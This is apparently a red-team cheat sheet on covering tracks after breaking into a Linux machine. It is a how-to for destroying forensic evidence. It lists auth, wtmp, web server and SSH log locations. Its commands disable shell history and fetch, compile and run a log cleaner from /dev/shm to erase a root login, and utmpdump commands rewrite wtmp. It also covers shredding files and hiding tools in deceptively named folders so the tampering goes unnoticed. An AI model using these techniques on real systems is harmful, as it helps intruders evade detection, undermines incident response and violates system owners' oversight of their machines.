# ⭕ Covering Tracks

## <mark style="color:red;">Tools</mark>



## <mark style="color:red;">Login Events</mark>

`/var/log/auth.log` This is where are the activity and login's are stored, including failed attempted login's\
`/var/log/lastlog` Contents of accounts, port, and last login date & time.\
`/var/log/wtmp` Records all logins and logouts.

## <mark style="color:red;">Shell History</mark>

The shell history can be found in the home directory of a specific user, if you logged in as root, then in /root.\
They have a dot behind the file name, meaning they are "hidden" by executing `ls -la` you will see all the files including file permissions, who this file belogs to, the size of it , date and time.

`.sh_historycsh`\
`.historyksh`\
`.sh_historybash`\
`.bash_history`\
`.history`

\
As soon as you logged in your first command should be: `unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHST REMOTEHOST REMOTEUSER;export HISTSIZE=0`\
Which will unset all the variables in question so you don't leave any shell history behind from that point onwards and therefore you wouldn't need to remove or touch .bash\_history at all.

## <mark style="color:red;">**Command History**</mark>

`HISTFILE` Provides the location of the command buffer file.\
`HISTSIZE` Number of lines to be kept in the command history buffer.\
`HISTSAVE` Determines whether the command history should be saved on disk or not.

## <mark style="color:red;">**Temp Files**</mark>

`/tmp/`\
`/var/tmp/`\
If you have compiled something, or used a tool that creates temporary files, make sure you visit these folders and remove any of YOUR leftovers.

Note: The /var/tmp directory is made available for programs that require temporary files or directories that are preserved between system reboots. Therefore, data stored in /var/tmp is more persistent than data in /tmp

## <mark style="color:red;">**Sys Log**</mark>

`/etc/syslog` is a protocol for tracking and logging system messages\
`/etc/kern.log` kernel logs information and also dmesg (diagnostic message)

These are more if you are doing major changes to the system, I wouldn't worry about them but I am informing you just in case.

## <mark style="color:red;">**Other files of interest**</mark>

`/var/log/mail.log` If you send an email from within the system\
`/var/log/dpkg.log` If you have installed something on the system\
These are log files that are easily editable with any editor, you can just remove your activity.\
`/var/log/nginx/access.log`\
`/var/log/apache2/access.log`\
Quick scenario, you accessed a machine, through a web app vulnerability, so you executed some kind of RCE exploit or uploaded a webshell..either way your ip address and all the GET/POST requests will be in those files, consider checking those aswell.\
`/home/USER/.ssh/known_hosts`\
`/home/USER/.ssh/authorized_keys`\
`/root/.ssh/known_hosts`\
`/root/.ssh/authorized_keys`\
Also consider thinking about this, Have you made a connection from this machine to another one? Have you used an authorized\_key for logging without passwords?\
Have you used the browser? Clear the history of your activity.

## <mark style="color:red;">**Cron**</mark>

`/var/spool/cron/crontabs` # crontab -l to view the Crontab\
If you have set up some tasks to autorun, `crontab -r`

Now let's talk about tools, I personally don't know One that will fit all the scenarios and all the different distributions.

If you upload tools make sure not to use a common folder like the home, find a place like `/dev/shm` or you could consider making a hidden folder, often you will not be found if you use a folder name like `". "` or `" "`

Quick scenario: I just logged in a SSH, Here I am making sure that I don't leave any shell history from my activity and I will use a tool called mig-logcleaner to remove my log in entry from wtmp and lastlog.\
This is just for PoC, I know I used git, you may not have git installed, you can always clone/compile/ elsewhere and upload the binary on your own web server or just upload it from your PC via a SCP software (e.g winSCP)

Oneliner:

```bash
unset HISTFILE HISTSAVE HISTMOVE HISTZONE HISTORY HISTLOG USERHST REMOTEHOST REMOTEUSER;export HISTSIZE=0;cd /dev/shm;git clone https://github.com/Kabot/mig-logcleaner-resurrected.git;cd mig*;make linux;./mig-logcleaner -u root;cd ..;rm -rf mig*
```

However, if you'd rather go the manual route and with less tooling give this a go, utmpdump works great for this and is installed by default, this will remove the wtmp entry.\
See example below

```bash
utmpdump /var/log/wtmp | grep -v "tty1" > temp.txt
utmpdump -r < temp.txt > /var/log/wtmp
rm -f temp.txt
```

Why is this better than just doing rm -rf /var/log/auth.log; touch /var/log/auth.log and the same for .bash\_history? Well by now I would hope that we are on the same page with the fact that it would be very suspicious if all your logs were gone. If the logs are needing checked (lastlog for example) there should be previous activity recorded because we don't want to tamper too much with the logs.

If you upload other files and want to remove them permanently, here are some other tools that I recommend.

Shred, installed by default.

```bash
shred -zxuvf fileName
```

BashCopy

\-z, --zero     add a final overwrite with zeros to hide shredding\
\-x, --exact    do not round file sizes up to the next full block; this is the default for non-regular files\
\-u  deallocate and remove file after overwriting\
\-v, --verbose  show progress\
\-n, --iterations=N  overwrite N times instead of the default (3)

```bash
wipe fileName
wipe -r dirName
```

Another similar tool:\
Wipe, this tool repeatedly overwrites special patterns to the files to be destroyed. You can remove the contents of a single file, folder, or even the entire disk. This tool needs to be installed.

Shred renames a files to 0's many times and at the end deletes it

\
A few other command line tricks\
`sudo lsof | grep .log` check for currently open and active log files\
`sudo find / -cmin 0 -print` find recent documents on the system













